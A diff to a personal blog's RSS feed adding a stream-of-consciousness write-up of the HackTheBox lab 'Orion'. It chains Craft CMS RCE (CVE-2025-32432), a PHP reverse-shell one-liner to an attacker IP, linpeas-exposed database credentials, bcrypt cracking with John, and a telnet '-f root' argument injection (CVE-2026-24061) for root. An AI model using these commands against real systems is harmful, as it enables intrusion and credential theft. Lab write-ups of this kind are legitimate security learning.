@@ -8,7 +8,97 @@
     <language>en-us</language>
     <managingEditor>maaroofkhan2004@gmail.com (Maaroof Khan)</managingEditor>
     <webMaster>maaroofkhan2004@gmail.com (Maaroof Khan)</webMaster>
-    <lastBuildDate>Sun, 10 Aug 2025 16:46:16 +0530</lastBuildDate><atom:link href="https://Maaroof-Khan10.github.io/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 08 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://Maaroof-Khan10.github.io/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Orion (HTB) write-up</title>
+      <link>https://Maaroof-Khan10.github.io/posts/4/</link>
+      <pubDate>Wed, 08 Jul 2026 00:00:00 +0000</pubDate>
+      <author>maaroofkhan2004@gmail.com (Maaroof Khan)</author>
+      <guid>https://Maaroof-Khan10.github.io/posts/4/</guid>
+      <description>&lt;h1 id=&#34;orion-htb-write-up&#34;&gt;Orion (HTB) write-up&lt;/h1&gt;
+&lt;p&gt;I am taking a different approach for this write-up than usual. A more stream of conciousness style approach so that when I revisit it I can try to understand the thought process and learn how to/not to think.&lt;/p&gt;
+&lt;h2 id=&#34;initial-recon&#34;&gt;Initial Recon:&lt;/h2&gt;
+&lt;p&gt;As expected port 22 and 80 are open, doing a sV scan. Added to /etc/hosts. In-depth scan shows nginx running:&lt;/p&gt;
+&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap result:&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    nginx 1.18.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Webpage looks vibe coded. Uses &lt;code&gt;Craft CMS&lt;/code&gt; (could be attack vector). Starting with gobuster to find suddirectories.&lt;/p&gt;</description>
+      <content>&lt;h1 id=&#34;orion-htb-write-up&#34;&gt;Orion (HTB) write-up&lt;/h1&gt;
+&lt;p&gt;I am taking a different approach for this write-up than usual. A more stream of conciousness style approach so that when I revisit it I can try to understand the thought process and learn how to/not to think.&lt;/p&gt;
+&lt;h2 id=&#34;initial-recon&#34;&gt;Initial Recon:&lt;/h2&gt;
+&lt;p&gt;As expected port 22 and 80 are open, doing a sV scan. Added to /etc/hosts. In-depth scan shows nginx running:&lt;/p&gt;
+&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap result:&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    nginx 1.18.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Webpage looks vibe coded. Uses &lt;code&gt;Craft CMS&lt;/code&gt; (could be attack vector). Starting with gobuster to find suddirectories.&lt;/p&gt;
+&lt;p&gt;Gobuster found &lt;code&gt;/admin&lt;/code&gt; which runs &lt;code&gt;Craft CMS 5.6.16&lt;/code&gt; which is vulnerable to RCE &lt;em&gt;(CVE-2025-32432)&lt;/em&gt; due to a bug in the &lt;code&gt;/actions/assets/generate-transform&lt;/code&gt; URI where it can be exploited using POST requests.&lt;/p&gt;
+&lt;p&gt;For valid asset id it gives 302 and for invalid it gives 404, this enumeration is the further exploited by uploading php code.
+Read more: &lt;a href=&#34;https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/&#34;&gt;https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Found a PoC on gihub, testing it out now (Didn&amp;rsquo;t work): &lt;a href=&#34;https://github.com/CTY-Research-1/CVE-2025-32432-PoC.git&#34;&gt;https://github.com/CTY-Research-1/CVE-2025-32432-PoC.git&lt;/a&gt;
+The exploit shows it can&amp;rsquo;t parse the output, trying to do a reverse shell to see if we get response.
+Found reverse shell cheat sheet online, using &lt;code&gt;nc -lvnp 9999&lt;/code&gt; to listen, testing all to see which one works.&lt;/p&gt;
+&lt;p&gt;Previous exploit didn&amp;rsquo;t work probably, trying &lt;a href=&#34;https://github.com/cd-ratel/CVE-2025-32432.git&#34;&gt;https://github.com/cd-ratel/CVE-2025-32432.git&lt;/a&gt;. That exploit didn&amp;rsquo;t work either but it did give me the vulnerable &lt;code&gt;asset ID 2&lt;/code&gt; which could be useful.&lt;/p&gt;
+&lt;p&gt;Using a different one to confirm &lt;a href=&#34;https://github.com/TheMursalin/CVE-2025-32432.git&#34;&gt;https://github.com/TheMursalin/CVE-2025-32432.git&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Cheated a little but found out that using msfconsole works, trying it out. It worked and I got a meterpreter session (Finding &lt;code&gt;asset ID 2&lt;/code&gt; was useful afterall)! Now trying to get a proper shell using reverse-shell cheat sheet.
+Used reverse-shell cheat sheet to get a bash shell via netcat, then used:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
+- Ctrl+Z
+- stty raw -echo; fg; reset
+- export TERM=xterm-256color
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You&amp;rsquo;ll get a stable shell!&lt;/p&gt;
+&lt;p&gt;Use php for reverse shell as it is more stable than the bash reverse shell on this machine.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$sock=fsockopen(&amp;#34;YOUR-IP&amp;#34;,9999);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running &lt;code&gt;linpeas&lt;/code&gt; on vitcim gave us this:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-conf&#34; data-lang=&#34;conf&#34;&gt;CRAFT_DB_DRIVER=mysql
+CRAFT_DEV_MODE=true
+USER=www-data
+SHLVL=0
+HOME=/var/www
+OLDPWD=/var/www/html/craft/storage
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+CRAFT_ENVIRONMENT=dev
+LC_CTYPE=C.UTF-8
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_USER=root
+_=/usr/bin/sh
+TERM=xterm-256color
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_TABLE_PREFIX=
+PWD=/var/www/html/craft
+PRIMARY_SITE_URL=http://orion.htb/
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A database password, using &lt;code&gt;mysql&lt;/code&gt; I found a few databases, in &lt;code&gt;Orion&lt;/code&gt; the user table has:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-bcrypt&#34; data-lang=&#34;bcrypt&#34;&gt;$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Used &lt;code&gt;John the Ripper&lt;/code&gt; to get the password, it is BCrypt, a quick google search and the &lt;code&gt;$2y&lt;/code&gt; gives it away:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;john --format&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bcrypt --wordlist&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got the password as &lt;code&gt;darkangel&lt;/code&gt; and we now have an &lt;code&gt;ssh&lt;/code&gt; session as adam! The user flag is revealed.&lt;/p&gt;
+&lt;p&gt;Running &lt;code&gt;linpeas&lt;/code&gt; again as adam to see if we get some potential attack vectors:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;sudo 1.9.9&lt;/li&gt;
+&lt;li&gt;CVE-2021-4034 (High prob) - Failed&lt;/li&gt;
+&lt;li&gt;CVE-2026-41651 (Not proper priv esc though)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Lesson learned: first check which services are running (like ports), check their versions and then try to find exploits. If it fails then go for linpeas.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Did cheat a little but found out that &lt;code&gt;port 23 (telnet)&lt;/code&gt; was running, checking it&amp;rsquo;s version I found that it is vulnerable &lt;em&gt;(CVE-2026-24061)&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;If I first ran &lt;code&gt;sudo -l&lt;/code&gt;, I would have figured out that adam does not have sudo permission at all and I could&amp;rsquo;ve avoided using &lt;code&gt;linpeas&lt;/code&gt; at first.&lt;/p&gt;
+&lt;p&gt;Following this blog to understand and exploit: &lt;a href=&#34;https://www.offsec.com/blog/cve-2026-24061/&#34;&gt;https://www.offsec.com/blog/cve-2026-24061/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Since the port is running locally we use 127.0.0.1 as our IP&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USER&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-f root&amp;#39;&lt;/span&gt; telnet -a 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we got root shell!&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Outbound [Write-up] - HackTheBox</title>
       <link>https://Maaroof-Khan10.github.io/posts/2/</link>
